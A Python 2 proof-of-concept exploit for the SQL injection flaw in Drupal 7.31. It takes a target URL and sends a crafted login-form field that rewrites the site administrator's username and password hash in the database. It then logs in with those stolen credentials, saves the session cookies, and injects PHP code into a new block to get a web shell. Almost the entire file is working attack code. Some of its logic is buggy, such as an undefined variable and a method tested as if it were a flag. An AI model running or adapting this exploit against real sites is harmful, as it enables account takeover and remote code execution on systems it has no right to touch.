#/usr/bin/env python
#-*- utf-8 -*-

#The Standard library
import subprocess
import sys
import re
import urllib
import urllib2
import cookielib
# The third party library
import requests


class ProofOfConcept(object):
    """It's a Proof Of Concept for the SQL Injection Vulnerability of Drupal7.31"""
    
    def __init__(self, url="", username="", password=""):
        if username == "" and password == "":   #use default username and password
            self.username = "root" 
            self.unencrypt_password = "Helloknownsec"
            self.encrypt_password = subprocess.check_output(["php","get_encrypt_pass.php",self.unencrypt_password])
        else:                                   #use user difined username and password
            self.username = username
            try:
                self.unencrypt_password = password
                #use 'password.inc' to encrypt  password
                self.encrypt_password = subprocess.check_output(["php","get_encrypt_pass.php",self.unencrypt_password])
            except OsError,CalledProcessError:
                self.unencrypt_password = "Helloknownsec"
                self.encrypt_password = subprocess.check_output(["php","get_encrypt_pass.php",self.unencrypt_password])
                print "get encrypt password failed,use default password 'Helloknownsec'"
            
        if self.username and self.encrypt_password:
            print "your username is '%s',password is '%s'" % (self.username, self.unencrypt_password)
                    
        if url:           #check url 
            self.url = url
        else:
            print "Please input url which is you wanna attack:\n"
            tmp = raw_input()
            if tmp.find("http://") == 0:
                self.url = tmp
            else:
                print "Please input currect url"
        if url:
            print "your url is %s" % self.url        

        self.fill_word = "random"
        self.is_get_super_user = False
        self.is_log_in = False

    def _get_csrf_token(self, addons="", cookie=""):
        pattern_id = re.compile(r'name="form_build_id" value="(.+)"') 
        pattern_token = re.compile(r'name="form_token" value="(.+)"') 
        
        if addons and cookie:
            token_content = requests.get(self.url+addons,cookies=cookie)
            form_build_token = pattern_token.findall(token_content.content)[0]
            form_build_id = pattern_id.findall(token_content.content)[0]
            return form_build_id, form_build_token
        else:
            token_content = requests.get(self.url)
            form_build_id = pattern_id.findall(token_content.content)[0]
            return form_build_id
    
    def get_super_user(self):
        """
        This method can be used to replace the super username and password to yours
        """

        inject_sql_string1 = "name[0 ;update users set name='%s',pass='%s' where uid=1;# ]" % (self.username, self.encrypt_password)
        inject_sql_string2 = "name[0]"
        update_data = {
                inject_sql_string1:self.fill_word,  
                inject_sql_string2:self.fill_word,  
                "pass":self.fill_word,  
                "form_build_id":"",  
                "form_id":"user_login_block",  
                "op":"Log+in"  
        }
        print update_data
        response  = requests.post(self.url, timeout=20, data=update_data)
        response_content = response.content
        if response_content.find("mb_strlen() expects parameter 1 to be string") != -1:
            print "Get super user successful!"
            self.is_get_super_user = True

    def log_in(self):
        """use covered username and password to log in """

        form_build_id = self._get_csrf_token()
        print form_build_id

        login_data = {
            'name' : self.username,
            'pass' : self.unencrypt_password,
            'form_build_id' : form_build_id,
            'form_id' : 'user_login_block',
            'op' : 'Log+in',
        }
        if self.get_super_user:
            log_in_content = requests.post(url, data=login_data)
            if log_in_content.content.find("Log out") != -1:
                self.is_log_in = True
                print "Log in successful"
            else:
                print "Log in failed"
        else:
            print "Please exec get_super_user"

    def _get_cookie(self):
        if self.is_log_in:
            form_build_id = self._get_csrf_token()
            login_data = {
                'name' : self.username,
                'pass' : self.unencrypt_password,
                'form_build_id' : form_build_id,
                'form_id' : 'user_login_block',
                'op' : 'Log+in',
            }
            post_data = urllib.urlencode(login_data)
            cj = cookielib.LWPCookieJar()
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))  #bind cookie
            request = urllib2.Request(self.url,post_data)
            opener.open(request)
            if cj:

                cj.save('cookiefile.txt')  
            else:
                print "Get Cookies Error!"
            f = open('cookiefile.txt')
            cookiefile = f.read()
            pattern = re.compile(r'Set-Cookie3: (.+?)=(.+?);')  
            ret = pattern.findall(cookiefile)  
            cookies = {ret[0][0]:str(ret[0][1]).replace('"','')}  
            return cookies
        else:
            print "Please log in first!"
            return dict()

    def get_web_shell(self, php_code="<?php phpinfo();?>"):
        """
        Inject php code to drupal block for get a web shell
        Inject path: http://.../?q=username/structure/block/add/
        shell  path: http://.../?q=username/structure/block/add&render=overlay
        """
        cookie = self._get_cookie()
        url = self.url + "/?q=admin/structure/block/add&"
        form_build_id, form_build_token= self._get_csrf_token("/?q=admin/structure/block/add&render=overlay",cookie)
        shell_post_data = {
            'title':self.fill_word,
            'info':self.fill_word,
            'body[value]':php_code,
            'body[format]':'filtered_html',  #php_code
            'regions[bartik]':'-1',  
            'regions[seven]':'-1',  
            'visibility':'0',  
            'pages':'',  
            'custom':'0',  
            'visibility__active_tab':'edit-path',  
            'form_build_id':form_build_id,  
            'form_token':form_build_token,
            'form_id':'block_add_block_form',  
            'op':'Save+block',  
        }
        shell_content = requests.post(url, data=shell_post_data, cookies=cookie)  

        if shell_content.content.find("created") != -1:  
            print 'Get Shell Success:%s/?q=admin/structure/block&render=overlay' % url  
            return "%s/?q=admin/structure/block" % url  
        else:  
            print 'Get Shell Failed!'

if __name__ == "__main__":
    try:
        url = sys.argv[1]
    except:
	   print "Please give me a website url"
	   sys.exit()
    p = ProofOfConcept(url)
    p.get_super_user()
    p.log_in()
    # p.get_web_shell()
